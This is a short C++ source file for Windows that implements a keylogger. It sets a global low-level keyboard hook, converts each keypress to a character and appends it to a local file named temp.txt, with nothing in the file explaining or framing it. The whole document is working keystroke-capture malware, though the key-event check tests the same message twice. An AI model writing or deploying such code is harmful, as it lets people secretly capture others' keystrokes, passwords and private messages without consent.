#include <Windows.h>
#include <iostream>
#include <stdio.h>


LRESULT CALLBACK KBDHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT *s = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);

	if (wParam == WM_KEYDOWN || wParam == WM_KEYDOWN)
	{
        HANDLE hFile;
        hFile = CreateFile(
            L".\\temp.txt",
            FILE_APPEND_DATA,
            FILE_SHARE_READ,
            NULL,
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL);

        char c = MapVirtualKey(s->vkCode, MAPVK_VK_TO_CHAR);
        DWORD dwBytesWritten = 0;

            WriteFile(
                hFile,
                &c,
                sizeof(char),
                &dwBytesWritten,
                NULL
            );
      

        CloseHandle(hFile);
    }
		
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}



int main() {

	HHOOK kbd = SetWindowsHookEx(WH_KEYBOARD_LL, &KBDHook, 0, 0);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}
